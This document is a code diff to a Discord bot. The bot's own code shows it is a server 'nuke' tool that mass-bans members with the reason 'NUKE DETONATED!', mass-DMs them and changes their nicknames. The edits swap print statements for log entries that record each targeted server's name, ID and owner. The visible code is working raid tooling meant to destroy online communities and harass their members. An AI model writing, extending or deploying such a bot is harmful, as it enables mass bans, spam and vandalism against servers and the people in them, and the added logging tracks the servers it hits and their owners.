@@ -45,6 +45,7 @@ if "settings.json" not in listdir():
     file = open("settings.json", "w+")
     file.write(towrite)
     file.close()
+
     print()
 
 else:
@@ -106,7 +107,6 @@ def writeRoleIDs(write):
     file = open("settings.json", "w+")
     file.write(dumps(read))
     file.close()
-    print("")
 
 
 # Read and write volume settings
@@ -261,7 +261,13 @@ async def ban_members(ctx, member_list):
         member = await ctx.guild.fetch_member(member_id)
         try:
             await ctx.guild.ban(member, reason="NUKE DETONATED!")
-            print(f"Banned user \"{member.name}\"")
+            output_log(f'''
+Banned user: \"{member.name}\"
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
+
         except discord.Forbidden:
             output_log(f'''
 Failed to ban user "{member}": insufficient permissions.
@@ -662,7 +668,12 @@ async def skip(ctx):
                 try:
                     await member.send(settings["dm"][1])
                 except discord.HTTPException:
-                    print(f"Could not DM user {member.name}.")
+                    output_log(f'''
+Could not DM user {member.name}.
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
 
     if do_nick:
         nickname = settings["nick"][1]
@@ -675,7 +686,12 @@ async def skip(ctx):
                 try:
                     await member.edit(nick=nickname)
                 except discord.HTTPException:
-                    print(f"Could not nickname user {member.name}.")
+                    output_log(f'''
+Could not nickname user {member.name}.
+Server Name: {ctx.guild.name}
+Server ID: {ctx.guild.id}
+Server Owner: {ctx.guild.owner}
+''')
 
     if do_ban:
         member_list = []
